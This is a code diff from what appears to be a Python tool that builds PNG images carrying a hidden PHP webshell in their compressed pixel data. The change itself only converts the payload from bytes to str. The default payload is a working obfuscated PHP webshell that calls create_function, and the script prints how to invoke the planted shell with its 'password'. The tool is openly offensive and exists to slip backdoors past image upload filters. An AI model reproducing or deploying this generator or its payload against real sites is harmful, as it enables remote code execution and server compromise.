@@ -59,13 +59,12 @@ class DeflateSearcher:
 
 
 def generate(
-    text: bytes = b"<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>",
+    text: str = "<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>",
     height: int = 32,
     width: int = 32,
     output: str = "output.png",
 ):
-
-    payload = DeflateSearcher(target=text).find()
+    payload = DeflateSearcher(target=text.encode()).find()
     assert payload is not None, "Generate payload failed, consider using other webshell"
     assert len(payload) * 2 / 3 < width, "Width is too low!"
     arr = np.array(filter_one(payload) + filter_three(payload))
@@ -75,10 +74,10 @@ def generate(
     image = image.reshape([height, width, 3])
 
     Image.fromarray(image).save(output, optimize=False, compress_level=6)
-    if text not in Path(output).read_bytes():
+    if text.encode() not in Path(output).read_bytes():
         print("Generate failed")
         exit(1)
-    if text == b"<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>":
+    if text == "<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>":
         print("Usage: shell.php?0=create_function, password is 1")
 
 
